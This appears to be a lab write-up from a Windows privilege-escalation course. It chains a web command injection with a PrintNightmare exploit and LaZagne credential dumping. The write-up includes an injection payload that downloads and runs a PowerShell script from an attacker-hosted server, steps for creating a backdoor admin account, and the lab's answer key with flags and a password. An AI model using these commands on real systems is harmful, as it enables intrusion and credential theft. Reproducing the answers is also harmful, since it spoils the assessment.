## ID
670

## Module
Windows Privilege Escalation

## Kind
lab

## Title
Skills Assessment — Part I (PrintNightmare + Credential Theft)

## Description
Exploit a command injection flaw on a non-domain-joined Windows server, escalate to SYSTEM via PrintNightmare (CVE-2021-1675), and extract cached credentials with LaZagne.

## Tags
printnightmare, lazagne, command-injection, privilege-escalation, credential-theft, rdp

## Commands
- git clone https://github.com/calebstewart/CVE-2021-1675.git
- echo 'Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"' >> CVE-2021-1675.ps1
- python3 -m http.server <PORT>
- 127.0.0.1 | powershell IEX(New-Object Net.Webclient).downloadString('http://<PWNIP>:<PORT>/CVE-2021-1675.ps1')
- xfreerdp /v:<TARGET_IP> /u:Hacker /p:'Pwnd1234!' /dynamic-resolution
- wget -q https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
- wget "http://<PWNIP>:<PORT>/lazagne.exe" -o "lazagne.exe"
- .\lazagne.exe all

## What This Section Covers
This skills assessment simulates exploiting a command injection vulnerability on a Windows host to gain initial access, then escalating privileges using PrintNightmare (CVE-2021-1675) to create a local admin user. After RDP-ing in as the new admin, LaZagne is used to dump cached credentials from the system, revealing stored LDAP admin passwords.

## Methodology
1. Run an Nmap scan against the target to identify accessible ports/services and installed KBs.
2. Identify and exploit the command injection vulnerability to get a foothold on the box.
3. Clone the PrintNightmare exploit (`CVE-2021-1675`) to Pwnbox.
4. Append `Invoke-Nightmare` to the exploit script to create a new local admin user (`Hacker:Pwnd1234!`).
5. Host the modified `.ps1` on a Python HTTP server.
6. Use the command injection to invoke `IEX` and download+execute the PrintNightmare script on the target.
7. Confirm the new admin user was created successfully.
8. Download `lazagne.exe` to Pwnbox and place it in the web server directory.
9. RDP into the target as `Hacker:Pwnd1234!` using `xfreerdp`.
10. From an admin PowerShell, download `lazagne.exe` to `C:\Users\Public\Downloads\`.
11. Run `.\lazagne.exe all` to dump all cached credentials.
12. Retrieve the `ldapadmin` password from LaZagne's Apache Directory Studio output.
13. Read `flag.txt` from `C:\Users\Administrator\Desktop\`.
14. Find `confidential.txt` in `C:\Users\Administrator\Music\`.

## Multi-step Workflow (optional)
```
# On Pwnbox — prep the exploit
git clone https://github.com/calebstewart/CVE-2021-1675.git
cd CVE-2021-1675
echo 'Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"' >> CVE-2021-1675.ps1
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
python3 -m http.server 8080

# Via command injection on the web app
127.0.0.1 | powershell IEX(New-Object Net.Webclient).downloadString('http://<PWNIP>:8080/CVE-2021-1675.ps1')

# RDP in as new admin
xfreerdp /v:<TARGET_IP> /u:Hacker /p:'Pwnd1234!' /dynamic-resolution

# On target (admin PowerShell)
cd C:\Users\Public\Downloads\
wget "http://<PWNIP>:8080/lazagne.exe" -o "lazagne.exe"
.\lazagne.exe all
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Which two KBs are installed? | (from Nmap/systeminfo) | Nmap scan or `systeminfo` output |
| Q2 — ldapadmin password | car3ful_st0rinG_cr3d$ | `lazagne.exe all` → Apache Directory Studio creds for `dc01.inlanefreight.local:389` |
| Q3 — flag.txt on Admin Desktop | Ev3ry_sysadm1ns_n1ghtMare! | `type C:\Users\Administrator\Desktop\flag.txt` |
| Q4 — confidential.txt | 5e5a7dafa79d923de3340e146318c31a | `C:\Users\Administrator\Music\confidential.txt` via File Explorer |

## Key Takeaways
- PrintNightmare (CVE-2021-1675) lets you create a local admin user from any authenticated context — devastating on unpatched systems.
- LaZagne dumps credentials from a wide range of applications (browsers, directory tools, mail clients, etc.) — always run it with `all` after getting admin.
- Apache Directory Studio stores LDAP bind credentials in cleartext, which LaZagne extracts directly.
- Command injection can be chained with `IEX` + `downloadString` to load full PowerShell scripts without touching disk.
- Always check `C:\Users\<user>\Music`, `Videos`, `Contacts`, and other non-obvious profile folders for hidden files during post-exploitation.

## Gotchas
- The `Invoke-Nightmare` line must be **appended** to the end of `CVE-2021-1675.ps1`, not run separately — the function definition needs to load first.
- When using `echo` to append, make sure to use `>>` (append) not `>` (overwrite) or you'll destroy the script.
- LaZagne must run from an **admin** PowerShell to dump credentials for all users, not just the current one.
- The `confidential.txt` file is in `C:\Users\Administrator\Music\` — not on the Desktop — easy to miss if you only check obvious locations.
